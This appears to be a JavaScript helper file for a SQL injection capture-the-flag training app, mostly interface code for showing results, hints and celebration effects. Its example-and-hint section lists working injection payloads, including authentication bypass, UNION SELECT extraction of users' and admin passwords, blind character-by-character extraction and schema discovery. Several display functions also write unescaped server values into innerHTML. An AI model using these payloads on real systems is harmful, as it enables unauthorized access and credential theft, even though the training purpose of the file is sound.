// CTF Helper Functions
class CTFHelper {
    constructor() {
        this.attempts = 0;
        this.completedLevels = new Set();
        this.startTime = Date.now();
    }

    async loadChallenge(level) {
        window.location.href = `/level${level}`;
    }

    async setupDatabase() {
        try {
            showLoading('Setting up CTF database...');
            const response = await fetch('/setup');
            const result = await response.json();
            
            hideLoading();
            showModal('Database Setup', `
                <div class="setup-result">
                    <i class="fas fa-check-circle" style="color: var(--success-color); font-size: 2rem;"></i>
                    <h3>Database Ready!</h3>
                    <p>${result.message}</p>
                    <p>Challenges available: ${result.challenges}</p>
                    <p>Hidden flags: ${result.flags_hidden}</p>
                </div>
            `);
        } catch (error) {
            hideLoading();
            showModal('Setup Error', `
                <div class="error-result">
                    <i class="fas fa-exclamation-triangle" style="color: var(--danger-color); font-size: 2rem;"></i>
                    <h3>Setup Failed</h3>
                    <p>${error.message}</p>
                </div>
            `);
        }
    }

    displayResult(result) {
        const resultContainer = document.getElementById('result');
        resultContainer.style.display = 'block';
        
        let resultClass = result.success ? 'result-success' : 'result-error';
        resultContainer.className = `result-container ${resultClass}`;

        let html = `
            <div class="result-header">
                <h3>
                    <i class="fas fa-${result.success ? 'check-circle' : 'times-circle'}"></i>
                    ${result.message}
                </h3>
            </div>
        `;

        if (result.flag) {
            html += `
                <div class="flag-display">
                    <i class="fas fa-flag"></i> FLAG: ${result.flag}
                </div>
            `;
            this.completedLevels.add(currentLevel);
            this.celebrateSuccess();
        }

        if (result.query_executed) {
            html += `
                <div class="query-display">
                    <h4><i class="fas fa-code"></i> Executed Query:</h4>
                    <code class="sql-code">${this.escapeHtml(result.query_executed)}</code>
                </div>
            `;
        }

        if (result.technique) {
            html += `
                <div class="technique-display">
                    <h4><i class="fas fa-lightbulb"></i> Technique Used:</h4>
                    <p>${result.technique}</p>
                </div>
            `;
        }

        if (result.data && result.data.length > 0) {
            html += `
                <div class="data-display">
                    <h4><i class="fas fa-database"></i> Extracted Data:</h4>
                    <div class="data-table">
                        ${this.formatDataTable(result.data)}
                    </div>
                </div>
            `;
        }

        if (result.hint) {
            html += `
                <div class="hint-display">
                    <h4><i class="fas fa-question-circle"></i> Hint:</h4>
                    <p>${result.hint}</p>
                </div>
            `;
        }

        if (result.execution_time) {
            html += `
                <div class="time-display">
                    <h4><i class="fas fa-stopwatch"></i> Execution Time:</h4>
                    <p>${result.execution_time}</p>
                </div>
            `;
        }

        resultContainer.innerHTML = html;
        resultContainer.scrollIntoView({ behavior: 'smooth' });
    }

    formatDataTable(data) {
        if (!data || data.length === 0) return '<p>No data found</p>';
        
        const headers = Object.keys(data[0]);
        let html = '<table class="data-table"><thead><tr>';
        
        headers.forEach(header => {
            html += `<th>${this.escapeHtml(header)}</th>`;
        });
        html += '</tr></thead><tbody>';
        
        data.forEach(row => {
            html += '<tr>';
            headers.forEach(header => {
                html += `<td>${this.escapeHtml(String(row[header] || ''))}</td>`;
            });
            html += '</tr>';
        });
        
        html += '</tbody></table>';
        return html;
    }

    celebrateSuccess() {
        // Add some celebration effects
        this.createConfetti();
        this.playSuccessSound();
    }

    createConfetti() {
        const colors = ['#00ff41', '#ffd700', '#ff6b6b', '#4ecdc4', '#45b7d1'];
        const confettiCount = 50;
        
        for (let i = 0; i < confettiCount; i++) {
            const confetti = document.createElement('div');
            confetti.style.cssText = `
                position: fixed;
                top: -10px;
                left: ${Math.random() * 100}vw;
                width: 10px;
                height: 10px;
                background: ${colors[Math.floor(Math.random() * colors.length)]};
                pointer-events: none;
                z-index: 9999;
                animation: confetti-fall 3s linear forwards;
            `;
            
            document.body.appendChild(confetti);
            
            setTimeout(() => {
                confetti.remove();
            }, 3000);
        }
    }

    playSuccessSound() {
        // Create a simple success sound using Web Audio API
        try {
            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = audioContext.createOscillator();
            const gainNode = audioContext.createGain();
            
            oscillator.connect(gainNode);
            gainNode.connect(audioContext.destination);
            
            oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
            oscillator.frequency.setValueAtTime(1000, audioContext.currentTime + 0.1);
            
            gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
            gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.5);
            
            oscillator.start(audioContext.currentTime);
            oscillator.stop(audioContext.currentTime + 0.5);
        } catch (e) {
            console.log('Audio not supported');
        }
    }

    showExample(level) {
        const examples = {
            1: {
                title: "Level 1: Authentication Bypass Examples",
                content: `
                    <h4>Basic OR injection:</h4>
                    <code>admin' OR '1'='1' --</code>
                    
                    <h4>Comment-based bypass:</h4>
                    <code>admin'--</code>
                    
                    <h4>UNION NULL bypass:</h4>
                    <code>' OR 1=1 UNION SELECT NULL,NULL,NULL,NULL,NULL --</code>
                `
            },
            2: {
                title: "Level 2: UNION SELECT Examples",
                content: `
                    <h4>Extract from secrets table:</h4>
                    <code>' UNION SELECT secret_name,secret_value,'' FROM secrets --</code>
                    
                    <h4>Get all secrets:</h4>
                    <code>' UNION SELECT 'FLAG',secret_value,'' FROM secrets WHERE secret_name LIKE '%flag%' --</code>
                    
                    <h4>Multiple table extraction:</h4>
                    <code>' UNION SELECT username,password,email FROM users --</code>
                `
            },
            3: {
                title: "Level 3: Time-based Blind Injection Examples",
                content: `
                    <h4>Basic time delay:</h4>
                    <code>admin' AND (SELECT COUNT(*) FROM sqlite_master) > 0 --</code>
                    
                    <h4>Conditional time delay:</h4>
                    <code>admin' AND (SELECT CASE WHEN (1=1) THEN (SELECT COUNT(*) FROM users) ELSE 0 END) --</code>
                    
                    <h4>Extract data character by character:</h4>
                    <code>admin' AND (SELECT CASE WHEN SUBSTR((SELECT secret_value FROM secrets LIMIT 1),1,1)='C' THEN (SELECT COUNT(*) FROM users) ELSE 0 END) --</code>
                `
            },
            4: {
                title: "Level 4: Schema Discovery Examples",
                content: `
                    <h4>Discover all tables:</h4>
                    <code>' UNION SELECT name,sql FROM sqlite_master WHERE type='table' --</code>
                    
                    <h4>Access admin_users table:</h4>
                    <code>' UNION SELECT admin_name,secret_data FROM admin_users --</code>
                    
                    <h4>Extract admin passwords:</h4>
                    <code>' UNION SELECT admin_name,admin_pass FROM admin_users --</code>
                `
            }
        };

        if (examples[level]) {
            showModal(examples[level].title, examples[level].content);
        }
    }

    showHint(level) {
        const hints = {
            1: "Try using 'OR' condition to make the WHERE clause always true. Use '--' to comment out the password check.",
            2: "Use UNION SELECT to combine results from different tables. The secrets table contains the flag!",
            3: "Time-based injection relies on conditional delays. Try using CASE statements with COUNT operations.",
            4: "The sqlite_master table contains schema information. Look for hidden admin tables!"
        };

        if (hints[level]) {
            showModal(`Level ${level} Hint`, `<p><i class="fas fa-lightbulb"></i> ${hints[level]}</p>`);
        }
    }

    escapeHtml(text) {
        const map = {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#039;'
        };
        return text.replace(/[&<>"']/g, function(m) { return map[m]; });
    }
}

// Global helper functions
const ctfHelper = new CTFHelper();

function loadChallenge(level) {
    ctfHelper.loadChallenge(level);
}

function setupDatabase() {
    ctfHelper.setupDatabase();
}

function displayResult(result) {
    ctfHelper.displayResult(result);
}

function showExample(level) {
    ctfHelper.showExample(level);
}

function showHint(level) {
    ctfHelper.showHint(level);
}

function showModal(title, content) {
    const modal = document.getElementById('modal');
    const modalBody = document.getElementById('modal-body');
    
    modalBody.innerHTML = `
        <h2>${title}</h2>
        <div class="modal-content-body">${content}</div>
    `;
    
    modal.style.display = 'block';
}

function closeModal() {
    document.getElementById('modal').style.display = 'none';
}

function showLoading(message = 'Loading...') {
    const loadingDiv = document.createElement('div');
    loadingDiv.id = 'loading-overlay';
    loadingDiv.innerHTML = `
        <div class="loading-content">
            <div class="loading"></div>
            <p>${message}</p>
        </div>
    `;
    loadingDiv.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.8);
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 9999;
    `;
    
    document.body.appendChild(loadingDiv);
}

function hideLoading() {
    const loading = document.getElementById('loading-overlay');
    if (loading) {
        loading.remove();
    }
}

function displayError(message) {
    displayResult({
        success: false,
        message: message,
        hint: "Check your payload syntax and try again"
    });
}

// Add CSS for confetti animation
const style = document.createElement('style');
style.textContent = `
    @keyframes confetti-fall {
        0% {
            transform: translateY(-100vh) rotate(0deg);
            opacity: 1;
        }
        100% {
            transform: translateY(100vh) rotate(720deg);
            opacity: 0;
        }
    }

    .data-table {
        width: 100%;
        border-collapse: collapse;
        margin: 1rem 0;
        background: rgba(0, 0, 0, 0.3);
        border-radius: 5px;
        overflow: hidden;
    }

    .data-table th,
    .data-table td {
        padding: 0.8rem;
        text-align: left;
        border-bottom: 1px solid rgba(0, 255, 65, 0.2);
    }

    .data-table th {
        background: rgba(0, 255, 65, 0.2);
        color: var(--primary-color);
        font-weight: bold;
    }

    .data-table tr:nth-child(even) {
        background: rgba(0, 0, 0, 0.2);
    }

    .sql-code {
        display: block;
        background: rgba(0, 0, 0, 0.5);
        padding: 1rem;
        border-radius: 5px;
        border-left: 3px solid var(--primary-color);
        font-family: 'Courier New', monospace;
        color: var(--primary-color);
        margin: 0.5rem 0;
        overflow-x: auto;
    }

    .query-display,
    .technique-display,
    .data-display,
    .hint-display,
    .time-display {
        margin: 1.5rem 0;
        padding: 1rem;
        border-left: 3px solid var(--primary-color);
        background: rgba(0, 0, 0, 0.3);
    }

    .loading-content {
        text-align: center;
        color: var(--primary-color);
    }

    .loading-content p {
        margin-top: 1rem;
        font-size: 1.2rem;
    }
`;
document.head.appendChild(style);

// Close modal when clicking outside
window.onclick = function(event) {
    const modal = document.getElementById('modal');
    if (event.target === modal) {
        closeModal();
    }
};
